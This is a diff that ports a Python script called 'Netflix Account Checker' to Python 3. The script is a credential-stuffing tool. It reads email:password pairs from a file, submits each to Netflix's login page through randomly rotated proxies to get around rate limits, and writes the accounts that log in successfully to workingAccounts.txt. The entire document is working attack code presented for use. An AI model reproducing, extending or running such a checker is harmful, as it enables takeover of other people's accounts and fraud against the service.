@@ -1,166 +1,172 @@
-#!/usr/bin/python
+#!/usr/bin/python3
+# coding: utf-8
 
 from __future__ import division
-from progressbar import ProgressBar
-from  mechanize import Browser
+
 from os import path
 from random import randint
 from time import sleep
 
-working=[]
-dead=[]
-notActive=[]
+from mechanize import Browser
+from progressbar import ProgressBar
+
+working = []
+dead = []
+not_active = []
+current_proxy = None
+response = None
 br = Browser()
 
-def testAccount(email,password,typeProxy):
-            global currentProxy
-            global br
 
-            logoutURL = 'https://www.netflix.com/SignOut?lnkctr=mL'
-            page = 'Sorry, we are unable to process your request.'
-            while (page.find('Sorry, we are unable to process your request.') != -1):
-                try:
-                    proxies("Default")
-                    loginURL = 'https://www.netflix.com/login'
-                    br.set_handle_equiv(True)
-                    br.set_handle_redirect(True)
-                    br.set_handle_referer(True)
-                    br.set_handle_robots(False)
-                    br.addheaders = [('User-agent', 'Firefox')]
-                    if (currentProxy != ''):
-                        if (typeProxy != 'HTTP'):
-                            br.set_proxies({"socks5": currentProxy})
-                        else:
-                            br.set_proxies({"HTTP": currentProxy})
-                    else:
-                        br.set_proxies()
-                    br.open(loginURL)
-                    br.select_form(nr=0)
-                    br.form['userLoginId'] = email
-                    br.form['password'] = password
-                    response = br.submit()
-             
-                    if (response.code == 200):
-                        page = response.read().decode()
-                        if (page.find('Sorry, we are unable to process your request.') != -1):
-                            pass
-                        elif (response.geturl().find('browse') != -1):
-                            br.open(logoutURL)
-                            working.append(email+':'+password+'\n')
-                        elif (page.find('Finish Sign-up') != -1):
-                            br.open(logoutURL)
-                            notActive.append(email+':'+password)
-                        elif (response.geturl().find('getstarted') != -1):
-                            br.open(logoutURL)
-                            notActive.append(email+':'+password)
-                        elif (response.code == 500):
-                            errorFile = open('error.txt', 'a+')
-                            errorFile.write('500-Bad Gateway: currentProxy')
-                            errorFile.close()
-                        elif (page.find('Incorrect password') != -1):
-                            dead.append(email+':'+password)
-                        elif (page.find('find an account with this email address.') != -1):
-                            dead.append(email+':'+password)
-                        else:
-                            print('Unknown Error. (7)')
-                            errorFile = open('error.txt', 'a+')
-                            errorFile.write(response.geturl()+'\n'+page)
-                            errorFile.close()
-                    else:
-                        print('Error: '+str(response.code)+' Trying again.')
-                except Exception as errorMsg:
-                    print (response.geturl().find('getstarted'))
-                    errorFile = open('error.txt', 'a+')
-                    errorFile.write(response.geturl()+'\n'+page)
-                    errorFile.close()    
-                    br.open(logoutURL)
-                    sleep(3)
+def test_account(email, password, type_proxy):
+    global br, current_proxy, response
 
-def writeToFile():
-    global working
-    global dead
-    global notActive
+    logout_url = 'https://www.netflix.com/SignOut?lnkctr=mL'
+    page = 'Sorry, we are unable to process your request.'
+    while page.find('Sorry, we are unable to process your request.') != -1:
+        try:
+            proxies()
+            login_url = 'https://www.netflix.com/login'
+            br.set_handle_equiv(True)
+            br.set_handle_redirect(True)
+            br.set_handle_referer(True)
+            br.set_handle_robots(False)
+            br.addheaders = [('User-agent', 'Firefox')]
+            if current_proxy != '':
+                if type_proxy != 'HTTP':
+                    br.set_proxies({"socks5": current_proxy})
+                else:
+                    print("\n\nUsando proxy:", current_proxy)
+                    br.set_proxies({"HTTP": current_proxy})
+            else:
+                br.set_proxies()
+            br.open(login_url)
+            br.select_form(nr=0)
+            br.form['userLoginId'] = email
+            br.form['password'] = password
+            response = br.submit()
 
-    workingAccounts = open('workingAccounts.txt', 'w+')
-    deadAccounts = open('deadAccounts.txt', 'w+')
-    nonActiveFile = open('notActive.txt', 'w+')
-    for all in working:
-        workingAccounts.write(all)
-    for all in dead:
-        deadAccounts.write(all)
-    for all in notActive:
-        nonActiveFile.write(all)
-    workingAccounts.close()
-    deadAccounts.close()
-    nonActiveFile.close()
-    print ('')
-    print ('Summary:')
-    print ('--------')
-    print ('')
-    print ('Working accounts: ' + str(len(working)))
-    print ('Inactive Accounts: '+ str(len(notActive)))
-    print ('Dead accounts: ' + str(len(dead)))
-    print ('')
+            if response.code == 200:
+                page = response.read().decode()
+                if page.find('Sorry, we are unable to process your request.') != -1:
+                    pass
+                elif response.geturl().find('browse') != -1:
+                    br.open(logout_url)
+                    working.append(email + ':' + password + '\n')
+                elif page.find('Finish Sign-up') != -1:
+                    br.open(logout_url)
+                    not_active.append(email + ':' + password)
+                elif response.geturl().find('getstarted') != -1:
+                    br.open(logout_url)
+                    not_active.append(email + ':' + password)
+                elif response.code == 500:
+                    error_file = open('error.txt', 'a+', encoding='utf-8')
+                    error_file.write('500-Bad Gateway: currentProxy\n')
+                    error_file.close()
+                elif page.find('Incorrect password') != -1:
+                    dead.append(email + ':' + password)
+                elif page.find('find an account with this email address.') != -1:
+                    dead.append(email + ':' + password)
+                elif page.find('Please try again later.') != -1:
+                    error_file = open('error.txt', 'a+', encoding='utf-8')
+                    error_file.write('Too many request, need to use a proxy\n')
+                    error_file.close()
+                else:
+                    print('Unknown Error. (7)')
+                    error_file = open('error.txt', 'a+', encoding='utf-8')
+                    error_file.write(response.geturl() + '\n' + page)
+                    error_file.close()
+            else:
+                print('Error:', str(response.code), 'Trying again.')
+        except Exception as e:
+            print("\n\n", e)
+            exit(1)
+        else:
+            print(response.geturl().find('getstarted'))
+            error_file = open('error.txt', 'a+')
+            error_file.write(response.geturl() + '\n' + page)
+            error_file.close()
+            br.open(logout_url)
+            sleep(3)
 
-def proxies(country):
-    global currentProxy
-    proxyFile = "proxy-Default.txt"
-    if (path.exists(proxyFile) and path.getsize(proxyFile) > 0):
-        lines = open(proxyFile, "r")
-        filestream = open(proxyFile, "r")
-        randomProxyID = randint(0,sum(1 for row in lines) - 1)
-        for proxyID, proxy in enumerate(filestream):
-            if (proxyID == randomProxyID):
-                currentProxy = proxy
+
+def write_to_file():
+    global working, dead, not_active
+
+    working_accounts = open('workingAccounts.txt', 'w+', encoding='utf-8')
+    dead_accounts = open('deadAccounts.txt', 'w+', encoding='utf-8')
+    non_active_file = open('notActive.txt', 'w+', encoding='utf-8')
+    for acc in working:
+        working_accounts.write(acc)
+    for acc in dead:
+        dead_accounts.write(acc)
+    for acc in not_active:
+        non_active_file.write(acc)
+    working_accounts.close()
+    dead_accounts.close()
+    non_active_file.close()
+    print('\nSummary:')
+    print('--------\n')
+    print('Working accounts:', str(len(working)))
+    print('Inactive Accounts:', str(len(not_active)))
+    print('Dead accounts:', str(len(dead)), "\n")
+
+
+def proxies():
+    global current_proxy
+    proxy_file = "proxies.txt"
+    if path.exists(proxy_file) and path.getsize(proxy_file) > 0:
+        lines = open(proxy_file, "r", encoding='utf-8')
+        filestream = open(proxy_file, "r", encoding='utf-8')
+        random_proxy_id = randint(0, sum(1 for _ in lines) - 1)
+        for proxy_id, proxy in enumerate(filestream):
+            if proxy_id == random_proxy_id:
+                current_proxy = proxy
                 break
         filestream.close()
     else:
-        currentProxy = ''
+        current_proxy = ''
 
-def main():   
-    global debug
-    global working
-    global dead
 
-    print('')
-    print ('########################################################')
-    print ('####             Netflix Account Checker            ####')
-    print ('####              Coded by Abdes Salam              ####')
-    print ('####                                                ####')
-    print ('####                 DZ FAMILY TECH                 ####')
-    print ('########################################################')
-    print ('')
+def main():
+    global working, dead
+
+    print('\n########################################################')
+    print('####                                                ####')
+    print('####             Netflix Account Checker            ####')
+    print('####             Original by Abdes Salam            ####')
+    print('####              Recoded by Ceci Cifu              ####')
+    print('####                                                ####')
+    print('########################################################\n')
 
     try:
         accounts = 'checkAccounts.txt'
-        if (path.exists(accounts) and path.getsize(accounts) > 0):
+        if path.exists(accounts) and path.getsize(accounts) > 0:
             progress = 0
-            maxValue = sum(1 for acc in open(accounts))
-            pbar = ProgressBar(max_value=maxValue).start()
-            with open(accounts, "r") as filestream: 
+            max_value = sum(1 for _ in open(accounts))
+            pbar = ProgressBar(max_value=max_value).start()
+            with open(accounts, "r", encoding='utf-8') as filestream:
                 for line in filestream:
                     pbar.update(progress)
                     progress += 1
-                    accountArgument = line.split(':')
-                    args = len(accountArgument)
-                    if (args == 3 or args == 2):
-                        email = accountArgument[0]
-                        password = accountArgument[1]
-                        testAccount(email,password,'HTTP')
+                    account_argument = line.split(':')
+                    args = len(account_argument)
+                    if args == 3 or args == 2:
+                        email = account_argument[0]
+                        password = account_argument[1]
+                        test_account(email, password, 'HTTP')
                     else:
                         print('Account List is not formatted properly.')
-            
+
             pbar.finish()
-            writeToFile()
+            write_to_file()
         else:
-            print('Accounts file is empty!')
-            print('')
-    except Exception as errorMsg:
-        print('')
-        print(errorMsg)
-        print('An error occurred.. Saving progress...')
-        print('')
-        writeToFile()
+            print('Accounts file is empty!\n')
+    except Exception as e:
+        print("\n", e)
+        print('An error occurred.. Saving progress..')
+        write_to_file()
+
 
 if __name__ == "__main__":
-  main()
+    main()
